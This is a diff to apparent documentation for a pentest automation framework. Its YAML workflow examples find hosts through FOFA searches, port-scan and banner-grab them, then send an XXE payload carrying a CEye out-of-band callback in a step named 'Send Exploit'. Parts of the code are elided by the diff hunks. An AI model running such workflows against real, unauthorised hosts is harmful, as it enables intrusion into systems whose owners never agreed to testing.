@@ -442,18 +442,17 @@ jobs:
   discover:
     steps:
       - name: FOFA Search
-        run: |
+        script: |
           from ofx.api.search import Fofa
           fofa = Fofa()
           results = fofa.search('{{ inputs.target_query }}', size={{ inputs.max_targets }})
           targets = [r['ip'] for r in results]
           print(f"targets={','.join(targets)}")
-        script:
         outputs:
           targets: "{{ step.targets }}"
       
       - name: Port Scan
-        run: |
+        script: |
           from ofx.api.network import PortScanner
           scanner = PortScanner()
           all_results = []
@@ -464,12 +463,11 @@ jobs:
                   'open_ports': [r['port'] for r in results if r['status'] == 'open']
               })
           print(f"scan_results={all_results}")
-        script:
         outputs:
           scan_results: "{{ step.scan_results }}"
       
       - name: Service Detection
-        run: |
+        script: |
           from ofx.api.network import ServiceGrabber
           import json
           
@@ -480,7 +478,6 @@ jobs:
               for port in result['open_ports']:
                   info = grabber.grab(result['host'], port)
                   print(f"{result['host']}:{port} - {info.get('banner', 'No banner')}")
-        script:
 ```
 
 **OOB Testing Workflow:**
@@ -492,7 +489,7 @@ jobs:
   test_xxe:
     steps:
       - name: Generate OOB Payload
-        run: |
+        script: |
           from ofx.api.oob import CEye
           ceye = CEye()
           payload = ceye.build_request('xxe_test', type='http')
@@ -503,13 +500,12 @@ jobs:
           <data>&xxe;</data>'''
           print(f"payload={payload}")
           print(f"xml={xml}")
-        script:
         outputs:
           payload: "{{ step.payload }}"
           xml: "{{ step.xml }}"
       
       - name: Send Exploit
-        run: |
+        script: |
           import requests
           xml = '''{{ steps.0.outputs.xml }}'''
           response = requests.post(
@@ -517,10 +513,9 @@ jobs:
               data=xml,
               headers={'Content-Type': 'application/xml'}
           )
-        script:
       
       - name: Verify Callback
-        run: |
+        script: |
           import time
           from ofx.api.oob import CEye
           
@@ -535,5 +530,4 @@ jobs:
                   print(f"Callback from: {record['remote_addr']}")
           else:
               print("No callback received")
-        language: python
 ```
